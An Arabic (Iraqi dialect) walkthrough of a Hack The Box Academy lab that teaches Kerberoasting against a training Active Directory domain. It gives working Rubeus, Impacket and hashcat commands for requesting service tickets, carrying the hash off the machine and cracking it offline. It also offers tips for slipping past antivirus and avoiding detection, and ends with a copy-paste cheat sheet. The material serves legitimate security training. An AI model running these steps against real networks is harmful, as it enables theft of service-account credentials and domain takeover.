الـ Domain Controller (شباك التذاكر) غبي من ناحية وحدة: أي شخص عنده تذكرة دخول يومية (أي مستخدم عادي بالشركة، حتى لو جان موظف استعلامات بسيط)، يكدر يروح للشباك ويطلب تذكرة لأي لعبة بالملاهي (أي خدمة بالشبكة). الشباك ما راح يسألك "أنت مسموحلك تركب هالقطار لو لا؟"، راح يطبعلك التذكرة وينطيك إياها ويقولك "روح للعامل وهو يقرر يخليك تركب أو لا".

أنت كـ هكر (Ethical Hacker)، شنو راح تسوي؟

راح تدخل للشبكة بحساب موظف عادي جداً (htb-student). تروح للـ Domain Controller وتطلب تذكرة (TGS) لخدمة الـ VMware. الـ Domain Controller راح ينطيك التذكرة مشفرة بكلمة مرور حساب الـ VMware.

أنت ما راح تروح للـ VMware وتستخدم التذكرة! أنت راح تاخذ هذي التذكرة، تحطها بجيبك، تطلع من الشركة، وتروح للبيت (Offline Cracking).

بالبيت، تفتح حاسبتك القوية، وتشغل برنامج يجرب ملايين كلمات المرور (Brute-force/Dictionary Attack) على هذي التذكرة المشفرة. بما إن التذكرة مشفرة بباسورد الحساب مالت الخدمة، فبمجرد ما تنجح بفك التشفير، راح تعرف شنو هو الباسورد الأصلي للخدمة!

ليش هذا الهجوم خطير جداً وموجود بكل مكان؟

1. صامت جداً: طلب التذاكر هو أمر طبيعي جداً بالشبكة ويصير آلاف المرات بالدقيقة، محد راح يشك بيك.
    
2. حسابات الخدمات (Service Accounts) عادةً تمتلك صلاحيات عالية جداً (مرات Domain Admin) حتى تكدر تشغل السيرفرات.
    
3. المبرمجين والـ IT عادةً يخلون باسوردات هذي الحسابات ضعيفة، أو ينسون يغيروها لسنوات!
    

بهذا التحدي، راح نلعب دور الموظف العادي، نطلب تذكرة لخدمة VMware، نستخرجها، ونكسر تشفيرها حتى نطلع الباسورد الصريح.

━━━━━

🔵 المرحلة 1: المصطلحات

راح نمر على كل مصطلح مذكور بالسؤال والتحدي ونفصله تفصيل كأنك تسمعه لأول مرة.

Active Directory / AD (الدليل النشط)

- شنو يعني؟ هو حرفياً "دفتر العناوين ومدير الصلاحيات" الخاص بمايكروسوفت لأي شركة. بي تتخزن كل حسابات الموظفين، حاسباتهم، والجروبات. أي تسجيل دخول بالشركة يمر من خلاله.
    
- وين يظهر بالأوامر؟ ما يظهر كأمر مباشر، بس راح نتعامل وياه من خلال استهداف الـ Domain.
    

Domain Controller / DC (متحكم المجال)

- شنو يعني؟ هو السيرفر الرئيسي اللي شايل الـ Active Directory. هو القلب النابض للشبكة، هو اللي يتحقق من الباسوردات وهو اللي يوزع التذاكر (Kerberos Tickets). اختراقه يعني السيطرة الكاملة على الشركة.
    
- وين يظهر بالأوامر؟ مرات نحتاج نحدد الـ IP مالته بأدوات معينة باستخدام الـ flag اللي اسمه `-dc-ip`.
    

Kerberos (بروتوكول كيربيروس)

- شنو يعني؟ بروتوكول المصادقة (Authentication) الافتراضي بالـ Windows Active Directory. يعتمد كلياً على التشفير وتبادل "التذاكر" بدل تبادل الباسوردات بالنص الصريح بالشبكة.
    
- وين يظهر بالأوامر؟ يظهر بأسماء الأدوات مثل `Kerbrute` أو بكلمة `kerberoast` داخل أداة Rubeus.
    

TGT - Ticket Granting Ticket (تذكرة منح التذاكر)

- شنو يعني؟ التذكرة الذهبية اليومية. من تكتب باسوردك الصبح وحاسبتك تفتحه، الـ DC ينطيك هذي التذكرة. تستخدمها حتى تثبت إنك شخص مسجل بالشبكة وتطلب بيها تذاكر للخدمات الأخرى.
    

TGS - Ticket Granting Service (تذكرة الخدمة)

- شنو يعني؟ التذكرة المخصصة لخدمة معينة (مثل سيرفر طباعة، قواعد بيانات، ويب). هاي التذكرة هي الهدف مالتنا، لأنها مشفرة بكلمة مرور الحساب اللي يشغل الخدمة.
    

SPN - Service Principal Name (معرّف الخدمة)

- شنو يعني؟ هو "الاسم البرمجي" أو "الرقم الوظيفي" للخدمة داخل الـ Active Directory. أي خدمة تريد اليوزرات يتصلون بيها عن طريق Kerberos لازم يكون عدها SPN مسجل.
    
- مثال: إذا عندنا سيرفر SQL، الـ SPN مالته ممكن يكون `MSSQLSvc/sql-server.domain.local`. بالسؤال مالتنا الـ SPN هو `vmware/inlanefreight.local`.
    

Service Account (حساب الخدمة)

- شنو يعني؟ حساب يوزر بالـ Windows بس ما يستخدمه بشر (موظف). يستخدمه برنامج أو سيرفر حتى يشتغل. مثلاً برنامج الـ VMware يحتاج حساب حتى يشتغل بالخلفية، هذا الحساب هو اللي راح نسرق تذكرته.
    

Kerberoasting (هجوم تحميص كيربيروس)

- شنو يعني؟ اسم الهجوم اللي دنشرحه. يتكون من: العثور على حسابات تمتلك SPN، طلب تذكرة TGS لها، استخراج التذكرة بصيغة Hash، ثم كسر التشفير Offline.
    

Rubeus (أداة روبيوس)

- شنو يعني؟ أداة هجومية مكتوبة بلغة C# مخصصة للتعامل مع بروتوكول Kerberos داخل بيئة ويندوز. تعتبر السكين السويسري لهجمات الـ AD. تسوي كل شي بالذاكرة (In-memory) وهذا يخليها صعبة الاكتشاف من برامج الحماية.
    
- وين يظهر بالأوامر؟ راح نشغلها كملف تنفيذي `Rubeus.exe`.
    

Hash (البصمة الرياضية / التشفير)

- شنو يعني؟ نص غير مفهوم ناتج عن تشفير التذكرة. شكل الـ Hash يدل على نوع التشفير المستخدم. بالـ Kerberoasting، الـ Hash يبدأ عادة بـ `$krb5tgs$23$`.
    

RC4 / Etype 23 (نوع التشفير الضعيف)

- شنو يعني؟ خوارزمية تشفير قديمة جداً وضعيفة. الـ Kerberos يدعمها لأسباب تتعلق بالتوافق مع الأنظمة القديمة. التذكرة اللي تتشفر بـ RC4 (ويسمى برمجياً Etype 23) سهلة جداً وسريعة الكسر ببرامج مثل Hashcat.
    

Hashcat (أداة القط الهاشم)

- شنو يعني؟ أقوى وأسرع أداة لكسر كلمات المرور (Offline Cracking) تستخدم كارت الشاشة (GPU) حتى تجرب ملايين الكلمات بالثانية وتشوف يا كلمة تفتح التشفير.
    
- وين يظهر بالأوامر؟ نستخدمه مع الـ mode المناسب لمعالجة الـ Hash اللي جبناه.
    

Wordlist (قائمة الكلمات - rockyou.txt)

- شنو يعني؟ ملف نصي يحتوي على ملايين كلمات المرور المسربة من اختراقات سابقة. الأداة راح تجرب هذي الكلمات وحدة وحدة على الـ Hash. أشهر ملف بالعالم اسمه `rockyou.txt`.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة التحدي بلغة بسيطة:

إحنا كاعدين بحاسبة لينكس (Kali/Parrot). انطونا IP لحاسبة ويندوز داخل شبكة شركة اسمها (inlanefreight.local). انطونا يوزر وباسورد لموظف عادي جداً اسمه (htb-student).

المطلوب من عدنا:

1. ندخل لحاسبة الويندوز.
    
2. ندور بداخل الشبكة على خدمة الـ VMware اللي الـ SPN مالتها هو `vmware/inlanefreight.local`.
    
3. نعرف شنو اسم الحساب (Service Account) اللي ديشغل هاي الخدمة. (هذا الجواب الأول المطلوب بالسؤال).
    
4. نطلب تذكرة لهذي الخدمة ونسرق الـ Hash مالتها.
    
5. ناخذ الـ Hash لحاسبتنا اللينكس، ونشغل أداة Hashcat لكسر الباسورد الأصلي وإيجاده. (هذا الجواب الثاني المطلوب).
    

🎯 معطيات السيناريو:

- الضحية: Windows Machine (جزء من Active Directory).
    
- طريقة الاتصال: RDP (Remote Desktop Protocol).
    
- الصلاحيات الحالية: حساب موظف عادي (htb-student) — وهذا كافي جداً للهجوم!
    
- الهدف: حساب يمتلك SPN معين وتذكرته ضعيفة التشفير (RC4).
    

🧭 كيف تفكر؟ (Decision Tree لهجمات الـ Active Directory - Initial Access):

هل أنا داخل الشبكة وعندي حساب موظف؟

├── لا: أحتاج أبحث عن ثغرات ويب (Web Exploits) أو تصيد (Phishing) للحصول على موطئ قدم (Foothold).

└── نعم (مثل حالتنا): ممتاز! نبدأ مرحلة الـ AD Enumeration (التعداد داخل الدليل النشط).

ما هي أفضل خطوة أولى لموظف عادي في الـ AD؟

├── جرّب BloodHound: لرسم خريطة كاملة للشبكة.

├── جرّب AS-REP Roasting: للبحث عن حسابات لا تطلب مصادقة مسبقة.

└── جرّب Kerberoasting (حالياً): لأنها أسهل وأكثر ثغرة شائعة تجلب لك باسورداً حقيقياً لحساب عالي الصلاحيات.

ما هي الأداة المناسبة للـ Kerberoasting؟

├── أنا أعمل من جهاز Linux الخاص بي من الخارج (عبر VPN/Proxy): استخدم `GetUserSPNs.py` من حزمة Impacket.

└── أنا داخل حاسبة Windows مخترقة (مثل تحدينا هذا): استخدم `Rubeus.exe` لأنها تعمل بشكل أصلي وتوفر خيارات قوية.

🗺️ خريطة الهجوم (Roadmap) اللي راح نمشي عليها بالترتيب (بدون أوامر هسة، بس تخطيط):

١. [الاتصال عن بعد]: راح نفتح واجهة الويندوز مالت الهدف باستخدام أداة `xfreerdp` من اللينكس مالتنا، ونربط فولدر اللينكس بالويندوز حتى نكدر ننقل الملفات بسهولة.

٢. [الاستطلاع بالـ Rubeus]: راح نفتح موجه الأوامر بالويندوز، ونشغل أداة Rubeus بوضعية الـ (stats) فقط. ما راح نهاجم، بس نريد نشوف كم حساب قابل للاختراق وشنو أسمائهم، حتى نجاوب على الشق الأول من السؤال.

٣. [الهجوم وسحب الـ Hash]: راح نشغل Rubeus مرة ثانية بوضعية الهجوم الكاملة وسحب التذاكر بدون ما تنكسر الأسطر (nowrap). ونحفظ الناتج بملف.

٤. [نقل البيانات]: ننقل ملف الـ Hash من الويندوز إلى حاسبتنا اللينكس.

٥. [الكسر النهائي]: نشغل Hashcat مع ملف الكلمات `rockyou.txt` ونستخرج الباسورد الصريح حتى نجاوب على الشق الثاني من التحدي.

هل الخطة واضحة؟ يلا ننتقل للتنفيذ العملي (الاستغلال التفصيلي).

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

هنا راح نشتغل خطوة بخطوة، كل أمر وشنو يسوي، وكل Output نتوقعه.

الخطوة 1: الاتصال بحاسبة الهدف (Windows) عبر RDP

📌 ليش نسوي هاي الخطوة؟

السؤال يكول إحنا لازم نطبق الهجوم من داخل Windows Machine (لأننا بنلعب دور موظف كاعد على مكتبه). فراح نتصل بالـ IP اللي انطونا إياه باستخدام بيانات اليوزر `htb-student`.

🔧 الأمر (ينفذ من كالي لينكس مالتك):

Bash

```
xfreerdp /v:TARGET_IP /u:htb-student /p:Academy_student_AD! /dynamic-resolution /drive:.,/tmp
```

💡 ليش هذا الأمر بالذات؟ (شرح الـ Flags):

- أداة `xfreerdp`: هي أداة باللينكس لفتح Remote Desktop (شاشة سطح المكتب عن بعد) للويندوز.
    
- الفلاج `/v:TARGET_IP`: يعني الـ Target (IP الضحية). استبدله بالـ IP الفعلي.
    
- الفلاج `/u:` و `/p:`: تعني Username و Password للموظف.
    
- الفلاج `/dynamic-resolution`: يخلي الشاشة تتكبر وتتصغر براحتك بدون ما تخرب الأبعاد.
    
- الفلاج `/drive:.,/tmp`: هذا فلاج **ذهبي**! هذا يشارك فولدر الـ `/tmp` اللي بحاسبتك اللينكس، ويخليه يظهر كدرايف (مثل فلاش ميموري) داخل الويندوز. يفيدنا جداً بنقل الـ Hash لاحقاً.
    

الخطوة 2: استطلاع حسابات الخدمة (Kerberoastable Stats)

📌 ليش نسوي هاي الخطوة؟

أول ما ينفتح سطح المكتب مال الويندوز، ما نهجم فوراً. الهاكر الذكي يستكشف أولاً. نريد نعرف كم حساب بالشبكة عنده SPN؟ وشنو نوع التشفير؟ والأهم: نريد نعرف اسم الحساب اللي يخص خدمة VMware حتى نجاوب السؤال الأول.

🔧 الأمر (ينفذ من داخل الويندوز - افتح CMD):

DOS

```
cd C:\Tools
.\Rubeus.exe kerberoast /stats
```

💡 ليش هذا الأمر بالذات؟

- انتقلنا لمجلد `C:\Tools` لأن منصة HTB دائماً تخلي الأدوات الهجومية هناك مسبقاً.
    
- `Rubeus.exe`: أداة اختراق Kerberos.
    
- `kerberoast`: الموديول الخاص بالتحميص (الهجوم).
    
- `/stats`: أهم فلاج! يكول للأداة: "فقط اطبعلي الإحصائيات، لا تطلب أي تذكرة ولا ترسل ترافيك ضخم للـ Domain Controller". يفيدنا بالـ Recon.
    

📤 الـ Output المتوقع (الإجابة الأولى هنا):

Plaintext

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Kerberoasting Statistics

[*] Available krbtgt                  : 0
[*] Available service accounts        : 3

ServiceName            : svc_vmware
SPN                    : vmware/inlanefreight.local
EncryptionType         : RC4_HMAC
PwdLastSet             : 9/13/2021 6:02:16 AM
...
```

✅ الخطوة التالية واستنتاج الـ Mini-check:

⏸️ هل النتيجة منطقية؟ نعم! الأداة شافت 3 حسابات، وواحد منهم يطابق الـ SPN اللي نبحث عنه `vmware/inlanefreight.local`.

استخرجنا الإجابة الأولى: اسم الحساب (ServiceName) هو `svc_vmware`.

ولاحظ الـ EncryptionType هو `RC4_HMAC`! هذا خبر مفرح جداً، يعني التشفير قديم وضعيف وقابل للكسر بسهولة. لو كان AES-256، كان الوضع أصعب.

الخطوة 3: الهجوم الكامل وسحب تذكرة الخدمة (The TGS Hash)

📌 ليش نسوي هاي الخطوة؟

هسة بما إننا تأكدنا الهدف موجود وضعيف، راح نخلي Rubeus يطلب التذكرة فعلياً من الـ DC، ويستخرج الباسورد المشفر منها ويعرضه إلنا كنص Hash حتى نكسره.

🔧 الأمر:

DOS

```
.\Rubeus.exe kerberoast /nowrap > C:\Temp\hashes.txt
```

💡 ليش هذا الأمر بالذات؟

- شلنا `/stats` حتى الأداة تنفذ الهجوم الفعلي وتطلب التذاكر.
    
- `/nowrap`: فلاج حرج جداً! الهاش مالت Kerberos يصير طويل جداً. شاشة الـ CMD بالويندوز مرات تقص السطر الطويل وتنزل سطر جديد (Wrap). إذا صار هذا الشي، الهاش راح يخرب وأداة Hashcat راح ترفضه لأنها تعتبره ملف مكسور. كلمة nowrap تجبر الويندوز يطبع الهاش كسطر واحد طويل جداً.
    
- `> C:\Temp\hashes.txt`: نحفظ الناتج بملف نصي بدل ما يطبع على الشاشة، حتى يسهل نقله.
    

📤 الـ Output المتوقع (محتوى ملف hashes.txt):

Plaintext

```
[*] Total kerberoastable users : 3

[*] SamAccountName         : svc_vmware
[*] DistinguishedName      : CN=svc_vmware,OU=Service Accounts,DC=inlanefreight,DC=local
[*] ServicePrincipalName   : vmware/inlanefreight.local
[*] PwdLastSet             : 9/13/2021 6:02:16 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   :

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$A8D3F9E7B2...[hundreds of random chars]...9E4B
```

✅ الخطوة التالية:

الهاش اللي نحتاجه هو السطر الطويل اللي يبدأ بـ `$krb5tgs$23$`.

شنو معنى هذا الهاش؟

- `$krb5tgs$`: يعني هذا Hash مال Kerberos Version 5، نوع التذكرة TGS.
    
- `23$`: هذا الـ Etype (Encryption Type). رقم 23 يعني تشفير RC4-HMAC. (لو كان 18 يعني AES-256).
    

الخطوة 4: نقل الهاش إلى جهاز اللينكس (الـ Attacker)

📌 ليش نسوي هاي الخطوة؟

حاسبة الويندوز المخترقة ما بيها Hashcat، وما نريد ننزل برامج هكر ثقيلة عليها حتى لا ننكشف. دائماً عملية الـ Cracking تصير ببيئة المهاجم (Offline).

🔧 الأمر (من داخل الويندوز المخترق):

DOS

```
copy C:\Temp\hashes.txt \\tsclient\tmp\hashes.txt
```

💡 ليش هذا الأمر بالذات؟

تتذكر من شغلنا `xfreerdp` واستخدمنا `/drive:.,/tmp`؟ الـ xfreerdp يسوي شبكة وهمية اسمها `tsclient`، وداخلها يربط فولدر اللينكس مالتك. هذا الأمر ببساطة ينسخ الملف من الويندوز ويذبه مباشرة بـ `/tmp` باللينكس مالتك!

الخطوة 5: كسر التشفير واستخراج الباسورد (Cracking)

📌 ليش نسوي هاي الخطوة؟

هسة الهاش صار بجهاز اللينكس (Kali). راح نستخدم أقوى أداة لكسر الباسوردات (Hashcat) ونجرب عليها قاموس الكلمات الشهير (rockyou.txt).

🔧 الأمر (من شاشة الكالي لينكس):

Bash

```
hashcat -m 13100 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
```

💡 ليش هذا الأمر بالذات؟

- `hashcat`: الأداة نفسها.
    
- `-m 13100`: هذا الـ Mode. أداة Hashcat ما تعرف نوع الهاش وحدها، لازم تكولها. رقم `13100` هو الرقم الخاص بكسر تذاكر Kerberos اللي نوع تشفيرها RC4 (أي Etype 23).
    
- `/tmp/hashes.txt`: مسار الملف اللي بيه الهاش.
    
- `/usr/share/wordlists/rockyou.txt`: مسار ملف الكلمات (القاموس) اللي راح يجربه.
    

📤 الـ Output المتوقع (الإجابة النهائية):

Plaintext

```
hashcat (v6.2.5) starting...

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, LLVM 11.1.0, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [pocl]
=============================================================================================================================
...
Dictionary cache built:
* File: /usr/share/wordlists/rockyou.txt
* Passwords in dictionary: 14344384
...

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$A8D3F...9E4B:virtualpc1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL...
Time.Started.....: Fri Jul 31 11:45:00 2026
Recovered........: 1/1 (100.00%) Digests
```

✅ الخطوة التالية واستنتاج الـ Mini-check:

الـ Status مكتوب `Cracked`. وفي السطر اللي ظهر بيه الهاش، نلاحظ بالاخير مكتوب نقطتين رأسيتين `:` وبعدها كلمة `virtualpc1`.

نجح الهجوم! الباسورد هو `virtualpc1`.

━━━━━━━━━━━━━━

📊 ملخص مسار الهجوم (Attack Chain ASCII):

```
[Attacker (Kali)]
       │
       ├─ 1. RDP into Windows VM (xfreerdp)
       │
[Compromised Windows (htb-student)]
       │
       ├─ 2. Run: Rubeus kerberoast /stats (Identify svc_vmware)
       │
       ├─ 3. Run: Rubeus kerberoast /nowrap (Request TGS from Domain Controller)
       │
[Domain Controller] → Returns TGS encrypted with svc_vmware's RC4 hash
       │
[Compromised Windows]
       │
       ├─ 4. Save hash to hashes.txt and transfer back to Attacker via \\tsclient
       │
[Attacker (Kali)]
       │
       └─ 5. Run Hashcat -m 13100 on the hash with rockyou.txt
               │
               └─💰 PWNED! Password: virtualpc1
```

📐 ملخص الإجابات اللي طلبها التحدي:

|**الخطوة**|**الأداة**|**النتيجة المطلوبة**|
|---|---|---|
|إيجاد اسم الحساب للـ SPN المذكور|Rubeus (/stats)|`svc_vmware`|
|سحب الـ Hash|Rubeus (/nowrap)|$krb5tgs$23$....|
|كسر التشفير وإيجاد الباسورد|Hashcat (-m 13100)|`virtualpc1`|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

هنا راح نناقش السيناريوهات البديلة بالواقع، لو واجهتك مشاكل وما اشتغل السيناريو النموذجي.

🔄 Variations محتملة:

Variation 1: ماذا لو برنامج الحماية (Windows Defender) حذف أداة Rubeus فوراً؟

بالواقع، برامج الـ Antivirus تعشق اصطياد Rubeus لأنه مشهور جداً.

- البديل 1: حقن الأداة بالذاكرة باستخدام PowerShell بدون ما تلامس القرص الصلب.
    
- البديل 2: الاعتماد كلياً على أدوات من خارج بيئة الويندوز! بما أنك تعرف يوزر وباسورد `htb-student`، تكدر من الكالي لينكس مالتك مباشرة تستخدم سكريبت بايثون من حزمة `Impacket`.
    
    🔧 الأمر البديل لسحب التذاكر من الكالي مباشرة (Impacket):
    

Bash

```
impacket-GetUserSPNs inlanefreight.local/htb-student:'Academy_student_AD!' -dc-ip TARGET_IP -request
```

💡 هذا السكريبت يرسل طلب للـ DC عن بعد، ويسحب الهاش مباشرة ببيئة اللينكس مالتك بدون الحاجة للـ RDP أو أدوات داخل الويندوز! هاي تقنية ممتازة جداً وتتجنب كل جدران الحماية بالويندوز.

Variation 2: ماذا لو نوع التشفير ما كان RC4؟ ماذا لو كان AES-256؟

الشركات الحديثة تغلق بروتوكول RC4 الضعيف وتجبر استخدام AES. من تسوي Rubeus /stats راح تشوف الـ EncryptionType صار AES-256.

شنو يتغير؟ الهاش راح يتغير شكله. يبدأ بـ `$krb5tgs$18$`.

- الحل: عملية سحب التذكرة نفسها ما تتغير. لكن مرحلة الكسر بـ Hashcat تتغير. لازم تغير الـ Mode.
    
    🔧 الأمر البديل لكسر AES-256:
    

Bash

```
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

⚠️ ملاحظة: تشفير AES قوي جداً. كسر هاش AES-256 يستغرق وقت أطول بأضعاف مضاعفة من RC4. مرات يتطلب كارت شاشة خارق أو مزرعة سيرفرات لكسره، أو قاموس مخصص.

Variation 3: ماذا لو الباسورد ما انكسر باستخدام `rockyou.txt`؟

رسالة Hashcat طلعت `Exhausted` يعني خلص القاموس والباسورد مو موجود بيه.

- الحل الأول: استخدم "قواعد التحويل" (Rules) ويا Hashcat. الـ Rules راح تاخذ كلمات القاموس وتعدل عليها (تكبر أول حرف، تضيف أرقام 123 بالنهاية، تعكس الكلمة).
    
    🔧 الأمر بإضافة Rules:
    

Bash

```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

- الحل الثاني: توليد قاموس مخصص (Custom Wordlist). إذا كانت الشركة اسمها Inlanefreight، استخدم أداة `cewl` لسحب كل الكلمات من موقع الشركة الإلكتروني وتجربتها. الشركات غالباً تستخدم أسمائها بالباسوردات (مثل Inlane2021!).
    

═══════════

⚠️ أخطاء كارثية شائعة (الفخوخ - Traps):

🚨 الفخ الأول (بالـ Rubeus): نسيان فلاج `/nowrap`.

إذا ما استخدمته، الهاش راح ينطبع على الشاشة مقطع على عدة أسطر. إذا نسخته ولصقته بملف الـ Hashcat راح يكولك `Line-length exception` أو `Token length exception`. الهاش لازم يكون سطر واحد متصل.

🚨 الفخ الثاني (بالـ Hashcat): تحديد Mode خاطئ!

الهاشات مال كيربيروس تشبه بعضها. إذا عندك Etype 23 (RC4) واستخدمت मोड 19700، راح يفشل فوراً. دائماً اقرأ بداية الهاش:

- إذا `$krb5tgs$23$` ← استخدم `13100`.
    
- إذا `$krb5tgs$18$` ← استخدم `19700`.
    
- وإذا شفت هاش يبدأ بـ `$krb5asrep$` فهذا مو هجوم Kerberoasting، هذا هجوم ثاني اسمه AS-REP Roasting، والـ mode مالته `18200`! لا تخلط بينهم.
    

🚨 الفخ الثالث (في التفكير):

الاعتقاد بأن Kerberoasting هي ثغرة "نظامية" (Bug) ويمكن ترقيعها بباتش من مايكروسوفت. لا! هذا "تصميم" (Feature) بالبروتوكول. الطريقة الوحيدة للشركة حتى تحمي نفسها هي استخدام كلمات مرور طويلة جداً ومعقدة جداً (أكثر من 25 حرف) لحسابات الخدمات، حتى يستحيل كسرها بالـ Hashcat، بالإضافة إلى إيقاف تشفير RC4.

🔑 Golden Tips (نصيحة ذهبية من خبير):

"قبل ما تهجم بـ Rubeus، دائماً شيك الـ `/stats`. ليش؟ تخيل الشبكة بيها 500 حساب خدمة. إذا سويت هجوم سحب التذاكر لكل الـ 500 حساب دفعة وحدة، ملفات الـ Logs بالـ Domain Controller راح تنفجر من التنبيهات (Event ID 4769) وفريق الحماية (Blue Team) راح يصيدك فوراً. اسحب فقط التذكرة للحساب اللي انت تريده واستهدف الـ RC4 أولاً لأنه ينكسر أسرع."

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

راجع هذي البطاقات بذهنك قبل أي امتحان أو CTF يخص الـ AD.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الشرط الأساسي حتى يكون حساب الويندوز عرضة لـ Kerberoasting؟

✅ Back: يجب أن يمتلك الحساب SPN (Service Principal Name) مسجل باسمه في الـ Active Directory.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو نوع التذكرة التي نستهدف سرقتها في الـ Kerberoasting؟

✅ Back: تذكرة TGS (Ticket Granting Service).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: Rubeus: كيف نعرف الحسابات المصابة بدون إثارة الانتباه أو طلب التذاكر؟

✅ Back: باستخدام الفلاج `/stats`: `Rubeus.exe kerberoast /stats`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الفلاج الضروري في Rubeus لضمان عدم تلف الـ Hash عند نسخه؟

✅ Back: الفلاج `/nowrap` لضمان خروج الهاش في سطر واحد متصل.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: إذا كنت أعمل من Kali Linux وليس Windows، ما هي الأداة البديلة لـ Rubeus؟

✅ Back: السكريبت `GetUserSPNs.py` من حزمة Impacket.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: Hashcat: ما هو الـ Mode الخاص بكسر تذاكر Kerberos من نوع RC4 (Etype 23)؟

✅ Back: الـ Mode هو `13100`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف نزيد نسبة نجاح Hashcat إذا فشل قاموس rockyou.txt؟

✅ Back: باستخدام قواعد التحويل (Rules) عبر إضافة الفلاج `-r /path/to/rule/best64.rule`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

🛑 هاي الورقة تاخذلها سكرين شوت قبل أي تحدي AD، بيها الخلاصة التقنية اللي تحتاجها للـ Copy/Paste.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (AD Kerberoasting Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية الهجوم:

١. احصل على بيانات دخول لأي يوزر عادي بالـ Domain.

٢. استخدم Rubeus أو Impacket لاستطلاع الـ SPNs.

٣. اسحب تذكرة TGS (يفضل RC4 لسهولة الكسر).

٤. احفظ الهاش سطر واحد.

٥. اكسر الهاش Offline باستخدام Hashcat و Wordlist.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية:

|**المجال**|**الهدف**|**الأمر**|
|---|---|---|
|Recon|استطلاع الحسابات (Windows)|`.\Rubeus.exe kerberoast /stats`|
|Attack|سحب التذاكر (Windows)|`.\Rubeus.exe kerberoast /nowrap > hashes.txt`|
|Attack|سحب التذاكر (Linux)|`impacket-GetUserSPNs domain/user:pass -dc-ip IP -request`|
|Cracking|تحديد نوع الهاش|اقرأ بداية الهاش: `$krb5tgs$23$` هو RC4|
|Cracking|كسر RC4 (Etype 23)|`hashcat -m 13100 hashes.txt rockyou.txt`|
|Cracking|كسر AES-256 (Etype 18)|`hashcat -m 19700 hashes.txt rockyou.txt`|
|Cracking|إضافة Rules للكسر|`hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule`|
|Utility|مشاركة مجلد عبر RDP|`xfreerdp /v:IP /u:user /p:pass /drive:.,/tmp`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 Hashcat Modes الخاصة بـ Kerberos:

|**Mode**|**Hash Type**|**شكل الهاش**|
|---|---|---|
|13100|TGS-REP RC4 (Kerberoasting)|`$krb5tgs$23$...`|
|19700|TGS-REP AES-256 (Kerberoasting)|`$krb5tgs$18$...`|
|19600|TGS-REP AES-128 (Kerberoasting)|`$krb5tgs$17$...`|
|18200|AS-REP RC4 (AS-REP Roasting)|`$krb5asrep$23$...`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها):

❌ سحب تذاكر لـ 500 حساب دفعة واحدة ← الـ Blue Team راح يصيدك فوراً.

❌ نسيان فلاج `/nowrap` في Rubeus ← الهاش راح يكون مكسور ومتعدد الأسطر.

❌ الخلط بين Mode `13100` (للـ TGS) و Mode `18200` (للـ AS-REP) رغم إن اثنينهم يبدون بـ 23$.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة) — فهمت قصة الملاهي والتذاكر وتشفير الـ TGS بالباسورد مالت الخدمة.

✅ كل المصطلحات (AD, Kerberos, TGS, SPN, Hashcat, Rubeus...)

✅ كيفية التفكير (decision trees لكل نوع هجوم) — عرفت شلون نختار Rubeus لأننا داخل الويندوز، أو Impacket لو باللينكس.

